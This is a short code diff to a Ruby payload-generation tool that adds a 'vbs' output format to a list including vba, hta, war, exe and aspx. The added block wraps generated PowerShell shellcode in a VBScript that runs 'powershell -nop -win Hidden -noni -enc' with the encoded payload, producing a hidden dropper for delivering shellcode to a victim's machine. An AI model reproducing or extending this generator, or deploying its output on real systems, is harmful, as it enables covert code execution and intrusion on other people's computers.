@@ -52,7 +52,7 @@ optparse = OptionParser.new do|opts|
                 options[:PAYLOAD] = a
         end
 
-    opts.on('-t', '--ENCODE VALUE', "Output format: raw, cmd, vba, war, exe, java, php, hta, cfm, aspx") do |t|
+    opts.on('-t', '--ENCODE VALUE', "Output format: raw, cmd, vba, vbs, war, exe, java, php, hta, cfm, aspx") do |t|
                 options[:ENCODE] = t
         end
     opts.separator ""
@@ -181,6 +181,20 @@ End Sub
 
 end
     
+
+######################HTA_ENCODE###############################
+if $lencode == "vbs"
+
+powershell_encoded = gen_PS_shellcode()
+
+vbsTEMPLATE = %{Set objShell = CreateObject("Wscript.Shell")
+objShell.Run "cmd.exe /c powershell -nop -win Hidden -noni -enc #{powershell_encoded}", 0
+}
+
+puts vbsTEMPLATE
+
+end
+
 
 ########################WAR_ENCODE###############################
 if $lencode == "war"
@@ -387,4 +401,3 @@ aspxTEMPLATE = %{
 puts aspxTEMPLATE
 
 end
-
